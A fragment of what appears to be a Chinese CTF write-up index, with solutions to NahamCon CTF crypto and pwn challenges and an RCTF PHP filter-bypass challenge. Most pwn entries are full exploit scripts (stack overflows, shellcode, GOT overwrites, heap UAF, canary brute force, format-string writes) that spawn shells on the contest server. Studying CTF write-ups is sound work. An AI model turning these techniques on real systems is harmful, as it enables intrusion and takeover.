\"\" . join ( perm ) for perm in product ( * possibilities )] flag = b \"\" real_data = \"\" for i in range ( 0 , len ( data ), 4 ): crib = data [ i : i + 4 ] for case_variation in case_variations ( crib ): if all ( chr ( char ) in CHARSET for char in decode ( case_variation )): real_data += case_variation flag += decode ( case_variation ) print ( flag ) break print ( real_data ) \u57fa\u672c\u601d\u60f3\u4e00\u6837\u3002","title":"Unvreakable Vase"},{"location":"wp/NahamConCTF/#december","text":"\u7ed9\u4e86\u52a0\u5bc6\u6587\u672c\u548c\u6e90\u7801\uff1a from Crypto.Cipher import DES import string def XOR ( a , b ) : out = '' for i in range ( len ( a )) : out += chr ( ord ( a [ i ]) ^ ord ( b [ i ])) return out def printable ( l ): return all ( i in string . printable for i in l ) ciphertext = open ( \"ciphertext\" , \"rb\" ) . read () IV = '13371337' plain = [] even = [] odd = [] for i in range ( 0 , len ( ciphertext ), 8 ) : block = ciphertext [ i : i + 8 ] out = XOR ( block , IV ) if printable ( out ) : even . append ( out ) else : out = XOR ( key , out ) odd . append ( out ) plain . append ( out ) print even print odd print '' . join ( plain ) des\u7684ofb\u6a21\u5f0f\uff0c\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u653b\u51fb\u65b9\u6cd5\uff0c\u5bc6\u6587\u8fc7\u7a0b\u4e2d\u53ea\u6709\u5728\u5947\u6570\u6bb5\u4f1a\u7528\u5230key\uff0c\u5076\u6570\u4f4d\u5219\u4e0d\u4f1a\u8c03\u7528key\uff0c\u53ea\u8fdb\u884c\u7b80\u5355\u7684des\u3002\u901a\u8fc7\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5206\u6790\u6c42\u51fa\u3002\u4e0d\u8fc7\u56e0\u4e3a\u53ef\u7528\u4fe1\u606f\u5b9e\u5728\u592a\u5c11\uff0c\u63a8\u4e0d\u51fakey\u3002\u8fd9\u91cc\u91c7\u7528\u5f31\u5bc6\u94a5\uff0c\u539f\u7406\u540c\u4e0a\uff0c\u5177\u4f53\u7684\u6d41\u7a0b\u53ef\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u3002\u811a\u672c\uff1a from Crypto.Cipher import DES import string import re f = open ( 'ciphertext' , 'rb' ) ciphertext = f . read () f . close () parity = [ '0101010101010101' , 'FEFEFEFEFEFEFEFE' , 'E0E0E0E0F1F1F1F1' , '1F1F1F1F0E0E0E0E' ] noparity = [ '0000000000000000' , 'FFFFFFFFFFFFFFFF' , 'E1E1E1E1F0F0F0F0' , '1E1E1E1E0F0F0F0F' ] parity = [ i . decode ( 'hex' ) for i in parity ] noparity = [ i . decode ( 'hex' ) for i in noparity ] keylist = [ parity , noparity ] IV = '13371337' for key in keylist : for KEY in key : a = DES . new ( KEY , DES . MODE_OFB , IV ) plain = a . decrypt ( ciphertext ) print plain","title":"December"},{"location":"wp/NahamConCTF/#raspberry","text":"\u7ed9\u4e86n\uff0ce\uff0cc\uff1a n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317 e = 65537 c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681 \u5c1d\u8bd5\u5728\u7ebf\u5206\u89e3n\uff0c\u4e0d\u8fc7\u7d20\u6570\u56e0\u5b50\u6709\u5f88\u591a\u3002\u4e0d\u8fc7\u6d41\u7a0b\u662f\u4e00\u6837\u7684\uff0c\u53ea\u9700\u8981\u6c42\u591a\u4e2a\u7d20\u6570\u7684phi\u5373\u53ef\uff1a $$ phi = (p1-1) (p2-1) ... $$ \u811a\u672c\uff1a import gmpy2 from Crypto.Util.number import * pq = [ 2208664111 , 2214452749 , 2259012491 , 2265830453 , 2372942981 , 2393757139 , 2465499073 , 2508863309 , 2543358889 , 2589229021 , 2642723827 , 2758626487 , 2850808189 , 2947867051 , 2982067987 , 3130932919 , 3290718047 , 3510442297 , 3600488797 , 3644712913 , 3650456981 , 3726115171 , 3750978137 , 3789130951 , 3810149963 , 3979951739 , 4033877203 , 4128271747 , 4162800959 , 4205130337 , 4221911101 , 4268160257 ] n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317 e = 65537 c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681 phi = 1 for i in pq : phi *= ( i - 1 ) d = gmpy2 . invert ( e , phi ) print long_to_bytes ( pow ( c , d , n ))","title":"Raspberry"},{"location":"wp/NahamConCTF/#elsa4","text":"\u8fd9\u9053\u9898\u662f\u6700\u540e\u51e0\u4e2a\u5c0f\u65f6\u653e\u51fa\u6765\u7684\uff0c\u7b97\u6cd5\u4e0d\u592a\u5e38\u7528\uff0c\u540e\u9762\u4e86\u89e3\u662fEliseFour\u52a0\u5bc6\u7b97\u6cd5\u3002\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 https://fireshellsecurity.team/nahamcon-ctf-2020-elsa4/","title":"Elsa4"},{"location":"wp/NahamConCTF/#pwn","text":"","title":"Pwn"},{"location":"wp/NahamConCTF/#dangerous","text":"\u4e00\u9053\u975e\u5e38\u7b80\u5355\u7684\u6808\u6ea2\u51fa\uff0c\u8986\u76d6\u8fd4\u56de\u5730\u5740\u4e3a\u51fa\u9898\u4eba\u7559\u4e0b\u7684\u540e\u95e8\u3002\u5728\u521a\u5f00\u59cb\u505a\u8fd9\u9053\u9898\u7684\u65f6\u5019\uff0c\u6ca1\u6709\u6ce8\u610f\u5230\u51fa\u9898\u4eba\u7559\u7684\u540e\u95e8\uff0c\u800c\u6ea2\u51fa\u53c8\u53ea\u80fd\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u9677\u5165\u4e86\u56f0\u5883\uff0c\u8d70\u4e86\u633a\u591a\u5f2f\u8def\u3002\u6240\u4ee5\u5f97\u5148strings\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6709\u54ea\u4e9b\u5173\u952e\u5b57\u7b26\uff0c\u662f\u5426\u6709backdoor\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50011 ) else : sh = process ( './dangerous' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' sh . recvuntil ( 'name?' ) payload = 'a' * 0x1f1 + p64 ( 0x000000000401312 ) sh . send ( payload ) sh . interactive ()","title":"dangerous"},{"location":"wp/NahamConCTF/#saas","text":"\u4e00\u4e2a\u7531syscall\u5199\u7684\u7a0b\u5e8f\uff0c\u5141\u8bb8\u7528\u6237\u8c03\u7528\u5e38\u89c4\u7684syscall\uff0c\u7981\u7528\u4e86execve\u548c\u51e0\u4e2a\u4e0e\u7ebf\u7a0b\u6709\u5173\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u5229\u7528\u65b9\u6cd5\u5f53\u7136\u662forw\uff0c\u4f46\u662f\u7a0b\u5e8f\u4fdd\u62a4\u5168\u5f00\uff0c\u4e5f\u5c31\u662f\u8bf4\u6ca1\u6709\u5730\u65b9\u53bb\u5199\u5165\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u8981\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u7528brk\u7cfb\u7edf\u8c03\u7528\uff0c\u53bb\u5f00\u8f9f\u4e00\u4e2a\u65b0\u7684heap\uff0c\u5176\u8fd4\u56de\u503c\u4f1a\u662fheap\u7684\u5730\u5740\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u6709\u4e00\u4e2a\u5730\u5740\u6765\u5199\u5165\u4e86\u3002\u6ce8\u610f\uff0c\u7b2c\u4e00\u6b21\u8c03\u7528brk\u65f6\u662f\u521d\u59cb\u5316\u5806\uff0c\u8fd8\u6ca1\u6709\u771f\u6b63\u7684\u5206\u914d\u7269\u7406\u5730\u5740\uff0c\u8981\u7b2c\u4e8c\u6b21\u8c03\u7528\u65f6\u624d\u4f1a\u5206\u914d\u5730\u5740\u3002 from pwn import * from LibcSearcher import * from struct import pack , unpack if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50016 ) else : sh = process ( './saas' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def syscall ( rax = 0 , rdi = 0 , rsi = 0 , rdx = 0 , r10 = 0 , r8 = 0 , r9 = 0 ): sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rax )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rsi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdx )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r10 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r8 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r9 )) sh . recvuntil ( 'Rax: ' ) return int ( sh . recvline () . replace ( ' \\n ' , '' ), 16 ) def syscall2 ( rax = 0 , rdi = 0 , rsi = 0 , rdx = 0 , r10 = 0 , r8 = 0 , r9 = 0 ): sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rax )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rsi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdx )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r10 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r8 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r9 )) # brk() heap = syscall ( 12 , 0 ) syscall ( 12 , heap + 0x10000 ) # read(0,heap,0x20) syscall2 ( 0 , 0 , heap , 0x20 ) sh . sendline ( 'flag.txt \\x00 ' ) # open(heap) fd = syscall ( 2 , heap , 2 ) print hex ( fd ) # read(2,heap,0x30) syscall ( 0 , fd , heap + 0x20 , 0x30 ) # write(1,heap,0x30) syscall2 ( 1 , 1 , heap + 0x20 , 0x30 ) #gdb.attach(sh) sh . interactive ()","title":"saas"},{"location":"wp/NahamConCTF/#shifts-ahoy","text":"\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\uff0c\u6709\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u662f\u53ea\u80fd\u6ea2\u51fa\u5230\u8fd4\u56de\u5730\u5740\u3002\u6211\u4eec\u89c2\u5bdf\u6709\u6f0f\u6d1e\u7684\u51fd\u6570\uff0c\u5176\u5c06rsp\u7684\u503c\u4f20\u7ed9\u4e86r15\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u80fd\u5229\u7528jmp r15\u8fd9\u6837\u7684gadget\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06shellcode\u5e03\u7f6e\u5728\u6808\u4e2d\uff0c\u8fdb\u800c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50015 ) else : sh = process ( './shifts-ahoy' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x0000000000401263 # c # ''') jmp = 0x4011cd shellcode = asm ( shellcraft . sh ()) payload = '' for i in shellcode : n = ord ( i ) if n >= 13 : payload += chr ( n - 13 ) else : payload += chr ( 256 + n - 13 ) payload = payload . ljust ( 0x58 , ' \\x00 ' ) payload += p64 ( jmp ) sh . recvuntil ( '?' ) sh . sendline ( '1' ) sh . sendline ( payload ) sh . interactive ()","title":"shifts-ahoy"},{"location":"wp/NahamConCTF/#syrup","text":"\u548c\u4e0a\u4e00\u9053\u9898\u7684\u601d\u8def\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u8fd9\u9053\u9898\u6ca1\u6709\u7528\u4efb\u4f55\u5e93\u51fd\u6570\uff0c\u6240\u4ee5\u80fd\u5229\u7528\u7684gadget\u5f88\u5c11\uff0c\u89c2\u5bdf\u7a0b\u5e8f\u53d1\u73b0\uff0c\u8bfb\u5165\u7684\u6570\u636e\u7684\u5730\u5740\u662f\u7531rbp\u5bc4\u5b58\u5668\u63a7\u5236\u7684\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236rbp\u4e3abss\u5730\u5740\uff0c\u8fdb\u800c\u5c06shellcode\u5199\u5165bss\u4e2d\uff0c\u518d\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3abss\u5730\u5740\uff0c\u4e0d\u5c31ok\u4e86\u5417\uff1f from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50036 ) else : sh = process ( './syrup' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' shellcode = asm ( shellcraft . sh ()) canary = 0x6042 payload = 'a' * 0x400 + p64 ( canary ) payload += p64 ( 0x0000000000402011 ) payload += p64 ( 0x000000000040105D ) + p64 ( canary ) payload += p64 ( 0 ) + p64 ( 0x0000000000402011 ) sh . recvuntil ( '?' ) sh . sendline ( payload ) sh . sendline ( shellcode ) sh . interactive ()","title":"syrup"},{"location":"wp/NahamConCTF/#conveyor","text":"\u7a0b\u5e8f\u521b\u5efa\u4e86\u4e00\u4e2a\u5355\u9879\u94fe\u8868\uff0c\u4f46\u662f\u53ef\u4ee5\u4fee\u6539\u94fe\u8868\u7684next\u6307\u9488\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06\u67d0\u4e00\u4e2apart\u7684next\u6307\u9488\u4fee\u6539\u4e3agot\u8868\u7684\u5730\u5740\uff0c\u7136\u540e\u4fee\u6539atoi\u4fee\u6539\u4e3asystem\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50020 ) else : sh = process ( './conveyor' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( content ) def edit ( content ): sh . recvuntil ( 'safe?' ) sh . sendline ( 'y' ) sh . recvuntil ( ':' ) sh . sendline ( content ) add ( 'aaaaa' ) add ( 'bbbbb' ) add ( 'ccccc' ) choice ( 2 ) edit ( p64 ( 0 ) * 15 + p64 ( 0x0000000000602050 )) sh . recvuntil ( 'part: \\n ' ) puts_addr = u64 ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ) . ljust ( 8 , ' \\x00 ' )) libc = LibcSearcher ( 'setvbuf' , puts_addr ) libc_base = puts_addr - libc . dump ( 'setvbuf' ) system = libc_base + libc . dump ( 'system' ) print hex ( system ) sh . sendline ( p64 ( puts_addr ) + p64 ( system )) sh . sendline ( '/bin/sh \\x00 ' ) #gdb.attach(sh) sh . interactive ()","title":"conveyor"},{"location":"wp/NahamConCTF/#ripe_reader","text":"\u8fd9\u9053\u9898\u6709\u4e00\u70b9\u610f\u601d\uff0c\u7a0b\u5e8f\u662f\u4e00\u4e2a\u670d\u52a1\u7aef\u7cfb\u7edf\uff0c\u6bcf\u4e2a\u548c\u5b83\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u90fd\u662ffork\u7684\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u800c\u5b50\u8fdb\u7a0b\u548c\u7236\u8fdb\u7a0b\u62e5\u6709\u76f8\u540c\u7684\u5185\u5b58\u6570\u636e\uff0c\u53cacannary rbp\u7b49\u4fe1\u606f\u90fd\u662f\u76f8\u540c\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u7206\u7834\u7684\u65b9\u6cd5\u6765\u6cc4\u6f0fcannary\uff0crbp\uff0c\u7a0b\u5e8f\u57fa\u5740\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4f7f\u7528python sock\u5b9e\u73b0\u7684\uff0c\u6ca1\u6709\u7528pwntools\u3002 from socket import socket , timeout from struct import unpack , pack from time import sleep from telnetlib import Telnet from pwn import p64 import sys host = '127.0.0.1' port = 1234 if sys . argv [ 1 ] == \"scan\" : payload = b 'a' * 56 start = len ( payload ) stop = len ( payload ) + 8 while len ( payload ) < stop : for i in range ( 255 ): sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload + pack ( 'B' , i )[ 0 ]) sleep ( 0.1 ) res = sock . recv ( 1024 ) . decode () if \"Select one of the images:\" in res : print \"Found:\" + hex ( i ) payload += pack ( 'B' , i )[ 0 ] sock . close () break sock . close () canary = unpack ( '<Q' , payload [ - 8 :])[ 0 ] print 'canary:' + hex ( canary ) start = len ( payload ) stop = len ( payload ) + 8 while len ( payload ) < stop : for i in range ( 255 ): sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload + pack ( 'B' , i )[ 0 ]) sleep ( 0.1 ) res = sock . recv ( 1024 ) . decode () if \"Select one of the images:\" in res : print \"Found:\" + hex ( i ) payload += pack ( 'B' , i )[ 0 ] sock . close () break sock . close () bb = unpack ( '<Q' , payload [ - 8 :])[ 0 ] print hex ( bb ) start = len ( payload ) stop = len ( payload ) + 8 while len ( payload ) < stop : for i in range ( 255 ): sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload + pack ( 'B' , i )[ 0 ]) sleep ( 0.1 ) res = sock . recv ( 1024 ) . decode () if \"Select one of the images:\" in res : print \"Found:\" + hex ( i ) payload += pack ( 'B' , i )[ 0 ] sock . close () break sock . close () ret = unpack ( '<Q' , payload [ - 8 :])[ 0 ] print hex ( ret ) else : canary = 0xfaf43373050f5600 rbp = 0x7ffd1c3bf4c0 bb = 0x55ef50984000 rsi_r15_ret = bb + 0x0000000000001101 string_addr = rbp - 0x70 - 0x18 printfile = bb + 0x0000000000000FDC string = b 'flag.txt \\x00\\x00 ' payload = b './' * 23 + string + pack ( '<Q' , canary ) \\ + p64 ( rbp ) + p64 ( rsi_r15_ret ) + p64 ( string_addr ) + p64 ( 0 ) + p64 ( printfile ) sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload ) t = Telnet () t . sock = sock t . interact () sock . close ()","title":"ripe_reader"},{"location":"wp/NahamConCTF/#free-willy","text":"\u83dc\u5355\u9898\uff0c\u4fdd\u62a4\u5168\u5f00\uff0c\u6709\u4e00\u4e2auaf\u6f0f\u6d1e\u3002libc\u7248\u672c\u662f2.27\uff0c\u5373\u6709tcache\u673a\u5236\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u6cc4\u6f0f\u5730\u5740\u9700\u8981\u586b\u5145\u6ee10x90\u7684tcache\u518d\u8fdb\u884c\u6cc4\u6f0f\uff0c\u540c\u65f62.27\u7248\u672c\u7684tcache\u5e76\u6ca1\u6709\u5806double free\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528uaf\u4fee\u6539\u4e00\u4e2a\u5806\u5757\u7684\u5927\u5c0f\u4e3a0x90\uff0c\u7136\u540e\u8fde\u7eed\u662f\u54268\u6b21\u6765\u6cc4\u6f0flibc\u3002\u4e4b\u540e\u6211\u662f\u653b\u51fbatoi\u6765\u83b7\u5f97shell\u3002 from pwn import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50021 ) else : sh = process ( './free-willy' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) def choice ( elect ): sh . recvuntil ( 'Menu:' ) sh . sendline ( elect ) def add ( content ): choice ( 'adopt' ) sh . recvuntil ( ':' ) sh . sendline ( content ) def delete ( index ): choice ( 'disown' ) sh . recvuntil ( 'send away?' ) sh . sendline ( str ( index )) def edit ( index , content ): choice ( 'name' ) sh . recvuntil ( 'rename?' ) sh . sendline ( str ( index )) sh . recvuntil ( 'name?' ) sh . sendline ( content ) def show ( index , content ): choice ( 'name' ) sh . recvuntil ( 'observe?' ) sh . sendline ( str ( index )) add ( 'aaa' ) add ( 'bbb' ) add ( 'ccc' ) add ( 'ddd' ) delete ( 0 ) choice ( 'observe' ) sh . recvuntil ( '0. ' ) heap = u64 ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ) . ljust ( 8 , ' \\x00 ' )) print hex ( heap ) sh . sendline ( '1' ) a = ( heap & ( ~ 0xfff )) + 0x700 edit ( 0 , p64 ( a )) add ( p64 ( 0 ) + p64 ( 0x91 )) delete ( 3 ) edit ( 3 , p64 ( 0x0000000000603050 )) add ( '' ) for i in range ( 8 ): delete ( 1 ) choice ( 'observe' ) sh . recvuntil ( '1. ' ) libc_base = u64 ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ) . ljust ( 8 , ' \\x00 ' )) - 0x3ebca0 print hex ( libc_base ) sh . sendline ( '2' ) malloc = libc_base + libc . symbols [ 'malloc' ] fflush = libc_base + libc . symbols [ 'fflush' ] system = libc_base + libc . symbols [ 'system' ] rand = libc_base + libc . symbols [ 'rand' ] edit ( 5 , p64 ( malloc ) + p64 ( fflush ) + p64 ( system ) + p64 ( rand )) #gdb.attach(sh) sh . interactive ()","title":"free-willy"},{"location":"wp/NahamConCTF/#leet_haxor","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5148\u6cc4\u6f0flibc\u5730\u5740\uff0c\u7136\u540e\u4fee\u6539atoi\u7684got\u8868\u4e3asystem\u8fdb\u800c\u83b7\u5f97shell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50022 ) else : sh = process ( './leet_haxor' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def attack_vuln ( content ): sh . recvuntil ( 'exit' ) sh . sendline ( '0' ) sh . recvuntil ( ':' ) sh . sendline ( content ) # gdb.attach(sh,''' # b*0x000000000040084c # c # ''') #leak printf_got = 0x0000000000601030 attack_vuln ( '%33$p' ) sh . recvuntil ( ' \\n ' ) libc_start = int ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ), 16 ) - 231 libc = LibcSearcher ( '__libc_start_main' , libc_start ) libc_base = libc_start - libc . dump ( '__libc_start_main' ) system = libc_base + libc . dump ( 'system' ) print hex ( system ) #modify printf to system payload = '' length = 0 for i in range ( 4 ): data = system & 0xff if data > length : payload += '%' + str ( data - length ) + 'c%' + str ( 24 + i ) + '$hhn' else : payload += '%' + str ( 256 + data - length ) + 'c%' + str ( 24 + i ) + '$hhn' length = data system >>= 8 payload = payload . ljust ( 0x30 , ' \\x00 ' ) for i in range ( 4 ): payload += p64 ( printf_got + i ) attack_vuln ( payload ) sh . recvuntil ( 'exit' ) sh . sendline ( '1' ) sh . recvuntil ( ':' ) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive ()","title":"leet_haxor"},{"location":"wp/RCTF/","text":"Web \u00b6 calc \u00b6 \u7531\u4e8e\u8fd9\u6b21\u592a\u96be\u4e86\u90fd\u4e0d\u4f1a\u505a\uff0c\u53ea\u80fd\u7b80\u5355\u8bb0\u4e00\u9053\u5173\u4e8e\u5199shell\u7684\u9898 \u7ed9\u4e86\u6e90\u7801\uff1a <?php error_reporting ( 0 ); if ( ! isset ( $_GET [ 'num' ])){ show_source ( __FILE__ ); } else { $str = $_GET [ 'num' ]; $blacklist = [ '[a-z]' , '[\\x7f-\\xff]' , '\\s' , \"'\" , '\"' , '`' , '\\[' , '\\]' , '\\$' , '_' , '\\\\\\\\' , '\\^' , ',' ]; foreach ( $blacklist as $blackitem ) { if ( preg_match ( '/' . $blackitem . '/im' , $str )) { die ( \"what are you want to do?\" ); } } @ eval ( 'echo ' . $str . ';' ); } ?> \u8ddf\u4e0a\u6b21\u7684\u56fd\u8d5b\u4e00\u9053\u9898\u6709\u70b9\u50cf\uff0c\u4e0d\u8fc7\u9650\u5236\u4e86\u5b57\u6bcd\u7684\u4f7f\u7528\u3002\u4e0d\u8fc7\u53ef\u4ee5\u5229\u7528PHP\u7684\u9519\u8bef\u8fd0\u7b97\u8fd4\u56de\u6765\u6784\u9020\u5b57\u6bcd 1/0 \u8fd4\u56de INF //0\u4e3a\u9664\u6570 0/0 \u8fd4\u56de NAN \u7531\u4e8e\u524d\u9762\u6ca1\u6709\u8fc7\u6ee4 {} \u3001 . \u548c () \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ed6\u4eec\u6765\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u67d0\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5408\u4e0a\u9762\uff0c\u50cf\u8fd9\u6837 ((1/0).(0)){0} / I ((0/0).(0)){1} / A .... \u7136\u540e\u5229\u7528\u4f4d\u8fd0\u7b97\u6765\u6784\u9020\u5176\u4ed6\u5b57\u7b26\uff0c\u5148\u5c1d\u8bd5\u5728\u5df2\u5f97\u5230\u5b57\u7b26\u4e2d\u8fdb\u884c | (\u6216)\u8fd0\u7b97\u6216\u8005 & \u8fd0\u7b97 a = [ 'A' , 'F' , 'I' , 'N' ] for i in a : for j in a : print i , j , chr ( ord ( i ) | ord ( str ( j ))) print i , j , chr ( ord ( i ) & ord ( str ( j ))) \u53d1\u73b0\u80fd\u5f97\u5230\u7684\u5b57\u7b26\u589e\u52a0\u4e86 O \u3001 G \u3001 H \uff0c\u8fd8\u662f\u592a\u5c11\uff0c\u5728\u4e00\u6b21\u4f4d\u8fd0\u7b97\u4e2d\u5b57\u6bcd\u4e4b\u95f4\u7684\u8fd0\u7b97\u57fa\u672c\u6ca1\u6709\u4e86\uff0c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6570\u5b57\u5b57\u7b26\u6765\u751f\u6210\u65b0\u7684\u5b57\u7b26\uff08\u628a\u4e0a\u9762\u7684\u811a\u672c\u6539\u4e00\u4e0b\u5373\u53ef\uff09\uff0c\u65b0\u751f\u6210\u4e86 q\u3001s\u3001u\u3001v\u3001w\u3001y \u6570\u5b57\u5b57\u7b26\u751f\u6210\u65b9\u5f0f\u8ddf\u53d6\u5b57\u7b26\u5dee\u4e0d\u591a\uff0c\u5229\u7528 . \u8fde\u63a5\u5b57\u7b26\u6539\u53d8\u7c7b\u578b\u7136\u540e\u901a\u8fc7 {} \u53d6\u67d0\u4e2a\u6570\u5b57\u5b57\u7b26\u3002\u603b\u7ed3\u4e00\u4e0b\u73b0\u5728\u80fd\u5f97\u5230\u7684\u5b57\u6bcd\uff1a A F I N O G H q s u v w y 0-9 \u518d\u5c06\u5f97\u5230\u7684\u5b57\u7b26\u76f8\u4e92\u8fdb\u884c\u4f4d\u8fd0\u7b97\uff08\u65e0\u9650\u5957\u5a03\uff09\uff0c\u5f97\u5230\uff1a u&v t q&v p u&O E u&N D s&v r H|D L s&O C .... (\u57fa\u672c\u6240\u6709\u5b57\u6bcd\u90fd\u53ef\u4ee5\u6784\u9020)\uff0c\u5176\u5b9e\u8fd9\u91cc\u6211\u60f3\u5230\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u7528\u6cd5\uff0c\u53ef\u4ee5\u6784\u9020\u51fachr\u51fd\u6570\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\u4efb\u610f\u5b57\u7b26\u4e86\uff0c\u7f3a\u70b9\u5c31\u662fpayload\u6709\u70b9\u957f\u3002\u3002\u3002\u3002 \u6839\u636e\u4e0a\u9762\u6211\u4eec\u5c31\u53ef\u4ee5\u5199\u51fa\u4e00\u4e9b\u51fd\u6570\u4e86\uff0c\u5148\u770b\u4e00\u4e0bphpinfo\u4fe1\u606f\uff0c\u8fd9\u91cc\u5229\u7528\u4e86php7\u7684\u7248\u672c\u7279\u6027\uff0c\u53ef\u4ee5 ('phpinfo')() \u8fd9\u6837\u6765\u6267\u884c\u51fd\u6570\u3002\u52a0\u4e0aphp\u5bf9\u51fd\u6570\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u6784\u9020\u5982\u4e0b\uff1a (((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){0}&((1/0).(0)){0}).((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((1/0).(0)){0}).(((0/0).(0)){0}).(((1/0).(0)){2}).(((1/0).(0)){0}|((1/0).(0)){2}))() //('phpinfo')() 